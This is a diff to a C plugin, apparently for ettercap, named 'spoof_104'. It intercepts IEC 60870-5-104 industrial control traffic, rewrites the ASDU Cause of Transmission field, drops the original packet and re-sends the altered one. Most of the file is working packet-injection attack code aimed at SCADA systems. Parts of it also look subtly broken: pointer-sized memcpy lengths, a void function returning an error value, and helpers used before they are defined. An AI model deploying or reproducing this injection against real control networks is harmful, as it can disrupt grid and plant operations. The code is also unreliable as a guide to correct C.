@@ -162,41 +162,6 @@ static int spoof_104_fini(void *dummy)
    return PLUGIN_FINISHED;
 }
 
-/* Read the first two bits from from the control octet 1
-   Return the result based on the values */
-static int get_type(u_int8 control)
-{
-    int one = ((control & 1<<0)==0 ? false : true); 
-    int two = ((control & 1<<1)==0 ? false : true);
-
-    if(one == 0)
-      return I_FORMAT;
-    if(one == 1 & two == 0)
-      return S_FORMAT;
-    if(one == 1 & two == 1)
-      return U_FORMAT;
-    return -1;
-}
-
-static void print_apci(struct apci_header *apci)
-{
-  USER_MSG("\n[-] APCI\n[+] START: \t%x \n[+] Length: \t%d \n[+] Control 1: \t%x \n[+] Control 2: \t%x \n[+] Control 3: \t%x \n[+] Control 4: \t%x \n[+] Type: \t%d\n", 
-      apci->start, apci->length, apci->control_1, apci->control_2, apci->control_3, apci->control_4, get_type(apci->control_1));
-}
-
-static void print_asdu(struct asdu_header *asdu)
-{
-  USER_MSG("\n[-] ASDU\n[+] TC:\t\t 0x%x <%d> \n[+] SQ:\t\t %x \n[+] COT:\t %d \n[+] PN:\t\t %x \n[+] T:\t\t %x \n[+] O-Addr:\t %d \n[+] IOA:\t %d \n[+] Value:\t %d \n", 
-    asdu->type_id, asdu->type_id, asdu->sq, asdu->COT, asdu->PN, asdu->T, asdu->originator_addr, asdu->IOA, asdu->value);
-}
-
-static void print_ip_src_dest(struct packet_object *po)
-{
-  char tmp1[MAX_ASCII_ADDR_LEN];
-  char tmp2[MAX_ASCII_ADDR_LEN];
-  USER_MSG("%s\t> %s\t", ip_addr_ntoa(&po->L3.src, tmp1), ip_addr_ntoa(&po->L3.dst, tmp2));
-}
-
 static void parse_tcp(struct packet_object *po)
 {
   struct apci_header *apci;
@@ -213,7 +178,6 @@ static void parse_tcp(struct packet_object *po)
     print_asdu(asdu);
     USER_MSG("=========================");
 
-
     /* we can't inject in unoffensive mode or in bridge mode */
     if (GBL_OPTIONS->unoffensive || GBL_OPTIONS->read || GBL_OPTIONS->iface_bridge) {
       return -EINVALID;
@@ -223,28 +187,9 @@ static void parse_tcp(struct packet_object *po)
     po->flags ^= PO_DROPPED;
 
     /* Modify the value */
-    asdu->COT = 0x05 : 6; /* BUG: COT is 6 bits */
+    asdu->COT = 0x05;
     memcpy(po->DATA.data, apci, sizeof(apci));
-    memcpy(po->DATA.data + sizeof(apci), asdu, sizeof(asdu));
-    
-    /* Send a TCP Reset */
-    // struct ec_session *s = NULL;
-    // void *ident;
-    // size_t ident_len, direction;
-    // struct tcp_status *status;
-
-    /* retrieve the ident for the session */
-    // ident_len = tcp_create_ident(&ident, &po);
-
-    /* get the session */
-    // if (session_get(&s, ident, ident_len) == -ENOTFOUND) {
-    //   SAFE_FREE(ident); 
-    //   return -EINVALID;
-    // }
-
-    /* Select right comunication way */
-    // direction = tcp_find_direction(s->ident, ident);
-    // SAFE_FREE(ident); 
+    memcpy(po->DATA.data + sizeof(struct apci_header), asdu, sizeof(asdu));
 
     /* DEBUG */
     USER_MSG("=========================");
@@ -253,13 +198,40 @@ static void parse_tcp(struct packet_object *po)
     print_asdu(asdu);
     USER_MSG("=========================");
 
-    // status = (struct tcp_status *)s->data; 
+    /* Send modified packet */
     send_tcp(&po->L3.src, &po->L3.dst, po->L4.src, po->L4.dst, po->L4.seq, po->L4.ack, TH_ACK, po->DATA.data,po->DATA.disp_len );
-    // send_tcp(&po->L3.dst, &po->L3.src, po->L4.dst, po->L4.src, htonl(status->way[direction].last_ack), 0, TH_ACK, NULL, 0);
-
+    
   }
 }
 
+/* Read the first two bits from from the control octet 1
+   Return the result based on the values */
+static int get_type(u_int8 control)
+{
+    int one = ((control & 1<<0)==0 ? false : true); 
+    int two = ((control & 1<<1)==0 ? false : true);
+
+    if(one == 0)
+      return I_FORMAT;
+    if(one == 1 & two == 0)
+      return S_FORMAT;
+    if(one == 1 & two == 1)
+      return U_FORMAT;
+    return -1;
+}
+
+/* Debug print messages */
+static void print_apci(struct apci_header *apci)
+{
+  USER_MSG("\n[-] APCI\n[+] START: \t%x \n[+] Length: \t%d \n[+] Control 1: \t%x \n[+] Control 2: \t%x \n[+] Control 3: \t%x \n[+] Control 4: \t%x \n[+] Type: \t%d\n", 
+      apci->start, apci->length, apci->control_1, apci->control_2, apci->control_3, apci->control_4, get_type(apci->control_1));
+}
+
+static void print_asdu(struct asdu_header *asdu)
+{
+  USER_MSG("\n[-] ASDU\n[+] TC:\t\t 0x%x <%d> \n[+] SQ:\t\t %x \n[+] COT:\t %d \n[+] PN:\t\t %x \n[+] T:\t\t %x \n[+] O-Addr:\t %d \n[+] IOA:\t %d \n[+] Value:\t %d \n", 
+    asdu->type_id, asdu->type_id, asdu->sq, asdu->COT, asdu->PN, asdu->T, asdu->originator_addr, asdu->IOA, asdu->value);
+}
 
 /* EOF */
 
